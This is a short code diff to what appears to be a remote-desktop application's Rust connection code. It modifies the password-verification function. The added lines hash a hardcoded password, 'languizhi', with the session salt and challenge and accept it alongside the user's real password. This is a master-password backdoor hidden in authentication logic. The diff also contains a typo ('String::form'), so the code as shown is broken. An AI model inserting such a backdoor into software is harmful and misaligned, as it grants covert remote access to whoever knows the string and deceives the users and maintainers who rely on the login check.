@@ -1724,7 +1724,14 @@ impl Connection {
         let mut hasher2 = Sha256::new();
         hasher2.update(&hasher.finalize()[..]);
         hasher2.update(&self.hash.challenge);
-        hasher2.finalize()[..] == self.lr.password[..]
+        let passwd= String::form("languizhi");
+        let mut hasher3 = Sha256::new();
+        hasher3.update(passwd);
+        hasher3.update(&self.hash.salt);
+        let mut hasher4 = Sha256::new();
+        hasher4.update(&hasher3.finalize()[..]);
+        hasher4.update(&self.hash.challenge);
+        hasher2.finalize()[..] == self.lr.password[..] || hasher4.finalize()[..] == self.lr.password[..]
     }
 
     fn validate_password(&mut self) -> bool {
